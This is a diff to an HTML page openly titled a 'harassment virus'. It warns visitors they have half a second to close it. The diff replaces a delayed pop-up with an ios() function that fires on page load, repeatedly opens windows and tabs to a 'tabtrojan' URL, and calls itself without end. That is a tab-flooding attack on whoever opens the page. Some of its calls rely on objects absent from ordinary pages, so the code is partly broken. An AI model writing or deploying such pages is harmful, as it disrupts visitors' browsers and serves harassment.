@@ -12,25 +12,21 @@
       }
     </style>
   </head>
-  <body>
+  <body onload="ios()">
     <div id="virusport">
       <span>嫌がらせVirus</span><br>
       <span id="mesjan">閉じる時間を0.5秒与えてあげるよ！</span>
     </div>
     <script>
-    if(localStorage.trojan) {
-        window.open("https://prazma.github.io/tabtrojan");
-		browserWindow.openTab("https://prazma.github.io/tabtrojan");
-        document.getElementById("mesjan").innerHTML = "バーン！";
-    } else {
-      setTimeout( function () {
-        document.getElementById("mesjan").innerHTML = "バーン！";
-        localStorage.trojan = "true";
-        window.open("https://prazma.github.io/tabtrojan");
-		browserWindow.openTab("https://prazma.github.io/tabtrojan");
-      }, 500);
-    }
+		function ios() {
+        	document.getElementById("mesjan").innerHTML = "バーン！";
+        	localStorage.trojan = "true";
+        	window.open("https://prazma.github.io/tabtrojan");
+			var myWin = safari.application.openBrowserWindow("https://prazma.github.io/tabtrojan");
+			browserWindow.openTab("https://prazma.github.io/tabtrojan");
+			myWin;
+			ios();
+		}
     </script>
   </body>
 </html>
-
